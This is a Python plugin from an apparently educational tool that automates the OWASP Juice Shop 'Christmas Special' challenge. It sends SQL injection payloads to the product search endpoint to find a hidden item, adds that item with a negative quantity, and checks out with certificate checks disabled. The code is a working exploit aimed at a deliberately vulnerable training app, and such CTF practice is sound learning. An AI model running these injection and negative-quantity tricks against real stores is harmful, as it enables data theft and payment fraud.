# SOURCE FILE:    Christmas_Special.py
# PROGRAM:        JuiceShop automating attack application -- Plugin
# FUNCTIONS:      Solve CHRISTMAS SPECIAL Challenge
#                 1. Find hidden Christmas Special item by using SQL injection
#                 2. Add that item's ID into our basket
#                 3. checkout 
#          
# DATE:           Dec 6, 2022
# REVISIONS:      N/A
# PROGRAMMER:     Yoyo Wang
#
# NOTES
# RE: You need to have a user account first. (could run login function first)
#--------------------------------------------------------------------------------------

from plugins import attack as a
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from plugins import paybackTime as pt

#--------------------------------------------------------------------------------------
#Class: Chrismas_special
#Inherit: paybackTime
#--------------------------------------------------------------------------------------
class Chrismas_special(pt.paybackTime):

#--------------------------------------------------------------------------------------
#FUNCTION: __init__ 
#ARGUMENTS: N/A
#RETURNS: void
#Description: Initial class variables
#--------------------------------------------------------------------------------------
    def __init__(self, userEmail):
        # REST session
        self.juice_session = a.requests.session()
        # user's email address (registered)
        self.email = userEmail
        # user's credentials
        self.cookie, self.header = a.get_auth(self.email)
        # user's basket Id
        self.basketId = a.get_basket_id(self.email)
        # Chrismas special item's ID
        self.productId = self.get_product()
        # URL for user's shipping address
        self.address_url = a.URL + '/api/Addresss/'
        # URL for checkout
        self.checkout_url = a.URL + '/rest/basket/'+str(self.basketId)+'/checkout'

    def generator(self):
        pass

#--------------------------------------------------------------------------------------
#FUNCTION get_product
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: Find hidden Christmas Special item by using SQL injection
#             
#NOTES:
#--------------------------------------------------------------------------------------
    def get_product(self):
        f = open('plugins/SQL_injection_payloads.txt', 'r')
        while True:
            line = f.readline()
            if line:
                payload = a.URL + "/rest/products/search?q=" + line[:-1]
                response = self.juice_session.get(payload)
                if response.status_code == 200:
                    data_list = response.json()["data"]
                    for i in range(len(data_list)):
                        if "Christmas" in data_list[i]["name"]:
                            return data_list[i]["id"]
            else:
                break
        f.close()

#--------------------------------------------------------------------------------------
#FUNCTION run
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: This is the main function for plugin.
#             
#NOTES: None
#--------------------------------------------------------------------------------------
    def run(self):
        super().addto_basket(quantity=-5, productId=self.productId)
        json_data = super().generator()
        response = self.juice_session.post(self.checkout_url, cookies=self.cookie, headers=self.header, json=json_data,
                                           verify=False)
        print(response.text)







